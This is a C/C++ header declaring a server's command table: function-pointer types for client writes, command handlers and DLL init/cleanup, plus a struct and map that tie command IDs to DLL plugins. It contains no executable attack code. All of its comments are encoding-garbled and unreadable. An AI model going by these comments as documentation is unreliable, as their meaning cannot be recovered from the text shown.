#ifndef SVR_CMD_TABLE_H
#define SVR_CMD_TABLE_H

/** 
 ����д�������ɷ�����ܿ��ṩ 
 @param s TCP/UDP�Ự����
 @param	header Ӧ�ð�ͷ����
 @param buf ľ������д����ؿͻ��˵�����
 @param n ���ݳ���
 @return ʧ�ܷ���-1�����򷵻�д�ɹ����ݳ���
*/
typedef int (*writeToClient)(conn s, struct control_header* header, const char* buf, int n);

/** 
 �����������ģ���ִ�У��ɸ�������ֱ��ṩ
 @param s TCP/UDP�Ự����
 @param buf ľ�����˴Ӽ�ؿͻ��˽��յ�����
 @param n ���ݳ���
 @param fn �ص�����
 @return ʧ�ܷ���-1�����򷵻�0
*/
typedef int (*coreFunc)(conn s, char* buf , int n, writeToClient fn);


typedef int (*loadDll)();

/** 
 ��ʼ��dll
*/
typedef int (*onInitialize)(void*);

/** 
 ����dll��ĳЩ��Դ
*/
typedef int (*onUninitialize)(void*);


/**
 �й�����ִ��ģ��Ľṹ��
*/
typedef struct cmd_table
{   
	unsigned short		cmdID;			//����ID
	unsigned short		reserved;		//�����ֶ�
	coreFunc 			func;			//���ĺ�����ַ
	onUninitialize		destroy;		//��������ַ
	onInitialize		init;		//��ʼ��������ַ
	char				name[32];		//ʵ�ָ������ֵ�DLL��
}cmd_table;

/**
 ��������ִ��ģ��Ľṹ�壬�ɷ�����ܿ�ά��
*/
typedef std::map<unsigned short, cmd_table> CmdTables;


#endif